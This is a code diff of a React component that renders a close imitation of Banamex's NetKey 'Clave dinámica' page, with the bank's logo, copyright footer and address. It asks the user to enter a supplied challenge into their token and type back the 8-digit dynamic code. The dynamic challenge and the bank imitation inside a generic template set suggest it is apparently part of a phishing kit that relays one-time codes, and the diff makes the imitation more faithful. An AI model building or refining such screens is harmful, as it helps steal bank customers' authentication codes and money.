@@ -811,60 +811,109 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         };
         
         const netkeyContent = (
-          <div className="bg-white p-6 rounded-lg">
-            <div className="text-center mb-6">
-              <p className="text-sm text-gray-600 mb-4">
-                {formatBanamexDate()}
-              </p>
-              <h2 className="text-xl font-bold text-[#003d7a] mb-4">Clave dinámica</h2>
-            </div>
-            
-            <div className="bg-blue-50 p-6 rounded-lg mb-6 text-sm text-gray-700 leading-relaxed">
-              <p className="mb-4">
-                Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número <strong>"9"</strong>.
-              </p>
-              <p className="mb-4">
-                Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:
-              </p>
-              <div className="bg-white p-4 rounded border-2 border-[#003d7a] my-4">
-                <p className="text-xs text-gray-600 mb-2">CHALLNG:</p>
-                <p className="text-3xl font-bold text-[#003d7a] text-center tracking-widest font-mono">
-                  {screenData.challenge || '--------'}
-                </p>
+          <div className="max-w-[900px] mx-auto px-4 sm:px-7 py-7">
+            {/* Header */}
+            <header className="flex flex-col sm:flex-row items-start sm:items-center gap-4 sm:gap-5 mb-6">
+              <div className="flex items-center gap-3">
+                <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-label="Banamex logo">
+                  <g fill="#c81f3b">
+                    <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
+                    <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                    <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                  </g>
+                </svg>
+                <div className="text-xl font-semibold text-[#153e46]">Banamex</div>
               </div>
-              <p className="text-sm">
-                Presione "ENT." Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo
-              </p>
-            </div>
-            
-            <div className="mb-6">
-              <label className="block text-sm font-medium text-gray-700 mb-2">
-                Clave dinámica
-              </label>
-              <Input 
-                type="text" 
-                maxLength={8}
-                value={netkeyResponse}
-                onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
-                placeholder="________"
-                className="w-full p-4 text-center text-2xl tracking-widest font-mono border-2 border-[#003d7a] rounded"
-              />
-            </div>
-            
-            <Button 
-              className="w-full bg-[#003d7a] hover:bg-[#002855] text-white py-3 text-lg font-semibold"
-              onClick={handleNetkeySubmit}
-              disabled={netkeyResponse.length !== 8}
-            >
-              Continuar
-            </Button>
-            
-            <div className="mt-8 pt-6 border-t border-gray-200 text-center">
-              <p className="text-xs text-gray-500 mb-2">qbnelw03p-ND108-QRDIG-BNEWA10P</p>
-              <p className="text-xs text-gray-500">
-                D.R., © 2025, Banco Nacional de México, S.A., Integrante del Grupo Financiero Banamex.<br/>
-                Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
-              </p>
+              <div className="sm:ml-auto text-right">
+                <div className="text-sm text-[#2d4b51]" data-testid="datetime-netkey">
+                  {formatBanamexDate()}
+                </div>
+              </div>
+            </header>
+
+            {/* Main Card */}
+            <div className="bg-gradient-to-r from-[#f7fbfc] to-[#eef6f7] rounded-lg p-6 shadow-[0_6px_18px_rgba(0,0,0,0.08)] border border-[rgba(0,0,0,0.03)]">
+              <h1 className="text-2xl sm:text-3xl font-normal text-[#0b3b43] mb-5 flex items-center gap-3">
+                <span className="text-[#c81f3b]">»</span> Clave dinámica
+              </h1>
+
+              <div className="flex flex-col lg:flex-row gap-5">
+                {/* Left Panel - Instructions */}
+                <div className="flex-1 lg:flex-[1.1] bg-white rounded-md p-5 shadow-[0_3px_8px_rgba(0,0,0,0.04)] min-h-[260px] flex flex-col">
+                  <div className="text-[#133d43] text-sm leading-[1.45] space-y-4">
+                    <p>
+                      Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".
+                    </p>
+                    <p>
+                      Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:
+                    </p>
+                    
+                    <div className="mt-5 font-bold text-[22px] text-[#0b2b2f]" data-testid="challenge-code">
+                      CHALLNG: <span data-testid="challenge-value">{screenData.challenge || '--------'}</span>
+                    </div>
+
+                    <div className="flex-1"></div>
+                    
+                    <div className="mt-3">
+                      <button 
+                        className="px-3 py-2 rounded-md bg-[#fff5f6] text-[#c22f40] border border-[rgba(194,47,64,0.08)] text-sm font-semibold cursor-pointer hover:bg-[#ffe8ea] transition-colors"
+                        type="button"
+                        data-testid="button-cancel-left"
+                      >
+                        Cancelar
+                      </button>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Right Panel - Input */}
+                <div className="w-full lg:w-[320px] bg-white rounded-md p-5 shadow-[0_3px_8px_rgba(0,0,0,0.04)] flex flex-col justify-between">
+                  <div>
+                    <p className="mb-3 font-semibold text-[#193b3e] text-sm">
+                      Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo
+                    </p>
+
+                    <label htmlFor="dinamica" className="block text-[13px] text-[#134142] mb-2">
+                      Clave dinámica
+                    </label>
+                    <Input
+                      id="dinamica"
+                      type="text"
+                      maxLength={8}
+                      value={netkeyResponse}
+                      onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
+                      placeholder="Introduzca la clave dinámica aquí"
+                      className="w-full p-2 rounded-sm border border-[#cfdfe0] text-base"
+                      data-testid="input-netkey-response"
+                    />
+                  </div>
+
+                  <div>
+                    <div className="flex gap-3 mt-4 items-center justify-end">
+                      <button 
+                        className="px-5 py-2.5 rounded-[10px] bg-[#fff5f6] text-[#c22f40] border border-[rgba(194,47,64,0.08)] text-sm font-semibold cursor-pointer hover:bg-[#ffe8ea] transition-colors"
+                        type="button"
+                        data-testid="button-cancel"
+                      >
+                        Cancelar
+                      </button>
+                      <button 
+                        className="px-5 py-2.5 rounded-[10px] bg-[#0f3e3f] text-white text-sm font-semibold cursor-pointer shadow-[0_6px_10px_rgba(15,62,63,0.12)] hover:bg-[#0a2d2e] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+                        onClick={handleNetkeySubmit}
+                        disabled={netkeyResponse.length !== 8}
+                        data-testid="button-continue"
+                      >
+                        Continuar
+                      </button>
+                    </div>
+
+                    <p className="mt-3 text-[#8b9aa0] text-xs leading-tight">
+                      D.R., © 2025, Banco Nacional de México, S.A., integrante del Grupo Financiero Banamex.
+                      Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
+                    </p>
+                  </div>
+                </div>
+              </div>
             </div>
           </div>
         );
